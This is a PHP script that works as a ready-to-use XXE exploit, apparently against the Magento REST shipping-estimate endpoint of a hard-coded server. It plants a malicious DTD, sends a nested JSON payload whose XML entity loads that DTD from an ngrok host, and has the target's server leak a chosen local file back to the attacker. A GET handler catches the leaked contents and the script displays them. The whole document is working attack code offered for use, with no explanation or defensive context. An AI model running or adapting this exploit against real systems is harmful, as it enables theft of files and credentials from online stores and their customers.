<!DOCTYPE html>
<html>

<body>
  <?php
	if ($_SERVER['REQUEST_METHOD'] === "POST") {
		$file = urldecode($_POST['file']);
		file_put_contents("dtd.xml", "<!ENTITY % data SYSTEM \"{$file}\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'https://b6e6-156-197-175-68.ngrok-free.app/ComicSting.php?leak=%data;'>\">");
		$url = "https://116.203.8.81/rest/V1/guest-carts/1/estimate-shipping-methods";

		$payload = array(
			"address" => array(
				"totalsCollector" => array(
					"collectorList" => array(
						"totalCollector" => array(
							"sourceData" => array(
								"data" => "<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM 'https://b6e6-156-197-175-68.ngrok-free.app/dtd.xml'>%sp;%param1;]><r>&exfil;</r>",
								"dataIsURL" => false,
								"options" => 1337
							)
						)
					)
				)
			)
		);

		$headers = array(
			'Content-Type: application/json'
		);

		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

		$response = curl_exec($ch);
		$curl_error = curl_error($ch);

		if ($curl_error) {
			echo '<pre>';
			echo "cURL Error: " . $curl_error;
			echo '</pre>';
		}

		curl_close($ch);

		// Wait for the leak parameter to be received
		$leak = '';
		$timeout = 30; // seconds
		$interval = 1; // seconds

		while ($timeout > 0) {

			if (file_exists("leak.txt") && filesize("leak.txt") > 0) {
				$leak = file_get_contents("leak.txt");
				break;
			}
			sleep($interval);
			$timeout -= $interval;
		}

		if ($leak) {
			echo '<pre>';
			echo "File contents: " . $leak;
			echo '</pre>';
		} else {
			echo '<pre>';
			echo "Timed out waiting for leak parameter.";
			echo '</pre>';
		}
	} elseif ($_SERVER['REQUEST_METHOD'] === "GET") {
		file_put_contents("leak.txt", $_GET['leak']);
	}

	?>
</body>

</html>